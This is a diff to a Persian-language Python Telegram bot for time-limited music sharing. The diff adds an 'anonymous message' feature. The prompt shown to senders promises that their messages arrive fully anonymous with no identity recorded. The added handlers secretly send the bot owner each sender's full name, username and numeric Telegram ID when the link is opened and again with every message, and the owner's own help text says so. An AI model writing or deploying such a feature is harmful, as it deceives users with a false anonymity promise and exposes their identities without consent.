@@ -21,16 +21,16 @@ from telegram.ext import (
 
 # شناسه انحصاری مالک ربات (عباس)
 OWNER_ID = 6073046430
+OWNER_DISPLAY_NAME = "Ả̸̱̻͕̜͔̗̹͗̐̏̄͜͝͝M̶͋̅͠"
 
-# دیکشنری نگهداری موزیک‌های فعال
+# نگهداری وضعیت‌ها در حافظه
 shared_music = {}
-
-# نگهداری موقت اطلاعات فایل تا زمان انتخاب ساعت اعتبار
 pending_uploads = {}
+users_in_anon_mode = set()  # کاربرانی که در حال نوشتن پیام ناشناس هستند
 
 
 async def health_check(request):
-    """پاسخ وب‌سرور برای زنده نگه داشتن سرور در Render توسط UptimeRobot"""
+    """وب‌سرور برای زنده نگه داشتن سرور در Render توسط UptimeRobot"""
     return web.Response(text="Bot is running!")
 
 
@@ -45,7 +45,7 @@ async def start_web_server():
 
 
 def format_remaining_time(remaining_seconds):
-    """تبدیل ثانیه به نمایش خوانا از زمان باقی‌مانده"""
+    """فرمت‌بندی زمان باقی‌مانده"""
     if remaining_seconds is None:
         return "♾ همیشگی (بدون انقضا)"
     if remaining_seconds <= 0:
@@ -82,11 +82,11 @@ async def delete_expired_message(context: ContextTypes.DEFAULT_TYPE):
 async def post_init(application):
     """تنظیم رسمی دکمه منو در کنار سنجاقک تلگرام"""
     owner_commands = [
-        BotCommand("my_musics", "📋 لیست و تایم باقی‌مانده آهنگ‌ها"),
+        BotCommand("my_musics", "📋 لیست و تایم موزیک‌های فعال"),
+        BotCommand("anon_link", "🔗 دریافت لینک پیام ناشناس"),
         BotCommand("help", "ℹ️ راهنما و وضعیت ربات"),
-        BotCommand("start", "🔄 شروع مجدد ربات"),
+        BotCommand("start", "🔄 شروع مجدد"),
     ]
-    # تنظیم منو به صورت اختصاصی برای چت شما
     try:
         await application.bot.set_my_commands(
             owner_commands, scope=BotCommandScopeChat(chat_id=OWNER_ID)
@@ -97,7 +97,6 @@ async def post_init(application):
     except Exception as e:
         print(f"منوی اختصاصی تنظیم نشد: {e}")
 
-    # منوی پیش‌فرض برای بقیه
     default_commands = [
         BotCommand("start", "شروع ربات"),
     ]
@@ -107,11 +106,57 @@ async def post_init(application):
         pass
 
 
+async def send_anon_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """ارسال لینک ناشناس برای مالک ربات"""
+    if update.effective_user.id != OWNER_ID:
+        return
+    bot_info = await context.bot.get_me()
+    anon_url = f"https://t.me/{bot_info.username}?start=anon_chat"
+    text = (
+        "🎭 **لینک اختصاصی ربات پیام ناشناس شما:**\n\n"
+        f"`{anon_url}`\n\n"
+        "💡 این لینک را کپی کنید و در بیو تلگرام، اینستاگرام یا هر جا خواستید قرار دهید.\n"
+        "هرکس روی آن کلیک کند، به عنوان فرستنده ناشناس به شما وصل می‌شود و هم‌زمان مشخصات کاملش برایتان ارسال می‌گردد!"
+    )
+    await update.message.reply_text(text, parse_mode="Markdown")
+
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     args = context.args
 
-    # اگر کاربر با لینک موزیک وارد شده باشد
+    # ۱. اگر مخاطب از طریق لینک پیام ناشناس وارد شده باشد
+    if args and len(args) > 0 and args[0] == "anon_chat":
+        if user.id == OWNER_ID:
+            await update.message.reply_text("این لینک پیام ناشناس خود شماست! آن را برای دوستانتان بفرستید.")
+            return
+
+        users_in_anon_mode.add(user.id)
+
+        # پیام به شخص فرستنده
+        welcome_anon = (
+            f"🎭 **شما در حال ارسال پیام ناشناس به «{OWNER_DISPLAY_NAME}» هستید.**\n\n"
+            "پیام شما (متن، وویس، موزیک، عکس یا ویدیو) به صورت کاملاً ناشناس و بدون ثبت هویت برای ایشان ارسال خواهد شد.\n\n"
+            "✍️ لطفاً پیام خود را بنویسید و ارسال کنید:"
+        )
+        await update.message.reply_text(welcome_anon, parse_mode="Markdown")
+
+        # نوتیفیکیشن هشدار آنی برای شما (مالک)
+        username_str = f"@{user.username}" if user.username else "ندارد"
+        alert_text = (
+            "🔔 **ورود مخاطب به ربات پیام ناشناس!**\n\n"
+            "یک کاربر هم‌اکنون لینک ناشناس را باز کرد و در حال ارسال پیام است:\n"
+            f"👤 **نام:** {user.full_name}\n"
+            f"🔗 **یوزرنیم:** {username_str}\n"
+            f"🆔 **آیدی عددی:** `{user.id}`"
+        )
+        try:
+            await context.bot.send_message(chat_id=OWNER_ID, text=alert_text, parse_mode="Markdown")
+        except Exception:
+            pass
+        return
+
+    # ۲. اگر کاربر با لینک موزیک وارد شده باشد
     if args and len(args) > 0 and args[0].startswith("music_"):
         music_id = args[0]
         if music_id in shared_music:
@@ -141,14 +186,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     data={"chat_id": user.id, "message_id": sent.message_id},
                 )
         else:
-            await update.message.reply_text(
-                "❌ متأسفانه این لینک منقضی یا باطل شده است."
-            )
+            await update.message.reply_text("❌ متأسفانه این لینک منقضی یا باطل شده است.")
         return
 
-    # استارت معمولی
+    # ۳. استارت معمولی
     if user.id == OWNER_ID:
-        # تضمین فعال بودن دکمه منو کنار سنجاقک
         try:
             await context.bot.set_chat_menu_button(
                 chat_id=user.id, menu_button=MenuButtonCommands()
@@ -158,26 +200,54 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await update.message.reply_text(
             "سلام عباس عزیز! خوش آمدی 👋\n\n"
-            "🔘 دکمهٔ **Menu** در پایین سمت چپ (کنار گیره/سنجاقک) فعال شد.\n"
-            "هر زمان خواستی لیست موزیک‌ها و زمان باقی‌مانده را ببینی، کافیست روی **Menu** لمس کنی!\n\n"
-            "برای شروع، هر فایل صوتی یا وویسی که دوست داری برایم بفرست."
+            "🤖 **ربات پیام ناشناس و موزیک شما آماده است.**\n"
+            "🔘 از دکمه **Menu** کنار سنجاقک می‌توانی لینک پیام ناشناس خود را بگیری یا موزیک‌هایت را مدیریت کنی.\n\n"
+            "برای اشتراک موزیک، کافیست فایل صوتی خود را بفرستید."
         )
     else:
-        await update.message.reply_text(
-            "سلام! برای دریافت فایل باید از لینکی که فرستنده داده استفاده کنید."
-        )
+        await update.message.reply_text("سلام! برای استفاده از امکانات، لطفاً از لینکی که دریافت کرده‌اید وارد شوید.")
+
+
+async def handle_anon_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """مدیریت پیام ارسالی از طرف کاربر ناشناس و فوروارد به مالک همراه با هویت"""
+    user = update.effective_user
+    msg = update.message
+
+    if user.id not in users_in_anon_mode:
+        return
+
+    username_str = f"@{user.username}" if user.username else "ندارد"
+    info_header = (
+        "📩 **پیام ناشناس جدید دریافت شد!**\n\n"
+        f"👤 **فرستنده:** {user.full_name}\n"
+        f"🔗 **یوزرنیم:** {username_str}\n"
+        f"🆔 **شناسه عددی:** `{user.id}`\n"
+        "─────────────────"
+    )
+
+    # ابتدا شناسنامه فرد برای شما ارسال می‌شود
+    await context.bot.send_message(chat_id=OWNER_ID, text=info_header, parse_mode="Markdown")
+
+    # پیام یا فایل فرد برای شما فوروارد/کپی می‌شود
+    await context.bot.copy_message(
+        chat_id=OWNER_ID,
+        from_chat_id=msg.chat_id,
+        message_id=msg.message_id
+    )
+
+    # تاییدیه به فرستنده
+    await msg.reply_text("✅ پیام شما به صورت ناشناس ارسال شد!")
+    users_in_anon_mode.discard(user.id)
 
 
 async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """راهنمای ربات"""
     if update.effective_user.id != OWNER_ID:
         return
     text = (
-        "ℹ️ **راهنمای ربات جعفَر موزیک:**\n\n"
-        "1️⃣ **ارسال آهنگ:** فایل صوتی رو بفرست تا گزینه‌های ساعت اعتبار برات بیاد.\n"
-        "2️⃣ **منوی کنار سنجاقک:** روی دکمه [ Menu ] بزن و گزینه «لیست و تایم باقی‌مانده» رو انتخاب کن.\n"
-        "3️⃣ **حذف فوری:** از داخل همون لیست می‌تونی هر آهنگی رو خواستی فوراً بسوزونی.\n"
-        "4️⃣ **امنیت کامل:** فقط با اکانت شما فایل پذیرفته میشه."
+        "ℹ️ **راهنمای ربات پیام ناشناس و موزیک:**\n\n"
+        "1️⃣ **دریافت پیام ناشناس:** از منوی کنار سنجاقک گزینه `دریافت لینک پیام ناشناس` را بزنید.\n"
+        "2️⃣ **ارسال موزیک تایم‌دار:** فایل صوتی خود را بفرستید تا زمان انقضایش را انتخاب کنید.\n"
+        "3️⃣ **مدیریت:** از طریق دکمه منو به لیست و زمان باقی‌مانده دسترسی دارید."
     )
     await update.message.reply_text(text, parse_mode="Markdown")
 
@@ -185,7 +255,6 @@ async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     if user.id != OWNER_ID:
-        await update.message.reply_text("⛔️ شما اجازه آپلود فایل ندارید. این ربات شخصی است.")
         return
 
     msg = update.message
@@ -207,7 +276,6 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
         file_name = msg.document.file_name or "فایل صوتی"
 
     if not file_id:
-        await msg.reply_text("فرمت فایل معتبر نیست.")
         return
 
     temp_id = uuid.uuid4().hex[:6]
@@ -220,7 +288,6 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "chat_id": msg.chat_id,
     }
 
-    # دکمه‌های شیشه‌ای انتخاب مدت اعتبار فایل
     keyboard = [
         [
             InlineKeyboardButton("⚡️ ۱ ساعت", callback_data=f"exp_{temp_id}_3600"),
@@ -238,15 +305,13 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     await msg.reply_text(
-        f"🎧 فایل دریافت شد: **{file_name}**\n\n"
-        f"⏱ چقدر برای بقیه معتبر بماند؟",
+        f"🎧 فایل دریافت شد: **{file_name}**\n\n⏱ مدت اعتبار لینک برای دیگران چقدر باشد؟",
         reply_markup=reply_markup,
         parse_mode="Markdown",
     )
 
 
 async def duration_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """تنظیم انقضا بر اساس انتخاب"""
     query = update.callback_query
     await query.answer()
 
@@ -285,9 +350,9 @@ async def duration_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     duration_text = format_remaining_time(duration_sec)
     await query.edit_message_text(
-        f"✅ **لینک با موفقیت ساخته شد!**\n\n"
+        f"✅ **لینک موزیک با موفقیت ساخته شد!**\n\n"
         f"🎵 نام: `{info['name']}`\n"
-        f"⏱ مدت اعتبار کل: **{duration_text}**\n\n"
+        f"⏱ مدت اعتبار: **{duration_text}**\n\n"
         f"🔗 **لینک اشتراک:**\n`{share_link}`",
         reply_markup=reply_markup,
         parse_mode="Markdown",
@@ -307,7 +372,6 @@ async def duration_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def list_my_musics(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """نمایش لیست فایل‌های فعال و تایم دقیق باقی‌مانده"""
     user = update.effective_user
     if user.id != OWNER_ID:
         return
@@ -344,7 +408,6 @@ async def list_my_musics(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def delete_button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """حذف دستی با دکمه شیشه‌ای"""
     query = update.callback_query
     await query.answer()
 
@@ -390,19 +453,30 @@ def main():
     # دستورات منوی تلگرام
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("my_musics", list_my_musics))
+    application.add_handler(CommandHandler("anon_link", send_anon_link))
     application.add_handler(CommandHandler("help", show_help))
 
-    # فایل‌های صوتی و دکمه‌ها
+    # هندلر دریافت پیام‌های ناشناس از کاربران
     application.add_handler(
         MessageHandler(
-            filters.AUDIO | filters.VOICE | filters.Document.Category("audio/"),
+            (~filters.COMMAND) & (~filters.User(user_id=OWNER_ID)),
+            handle_anon_message,
+        )
+    )
+
+    # هندلر فایل‌های صوتی مالک
+    application.add_handler(
+        MessageHandler(
+            (filters.AUDIO | filters.VOICE | filters.Document.Category("audio/")) & filters.User(user_id=OWNER_ID),
             handle_audio,
         )
     )
+
+    # دکمه‌های شیشه‌ای
     application.add_handler(CallbackQueryHandler(duration_callback, pattern=r"^exp_"))
     application.add_handler(CallbackQueryHandler(delete_button_callback, pattern=r"^del_"))
 
-    print("ربات فعال شد...")
+    print("ربات پیام ناشناس و موزیک فعال شد...")
     application.run_polling()
 
 
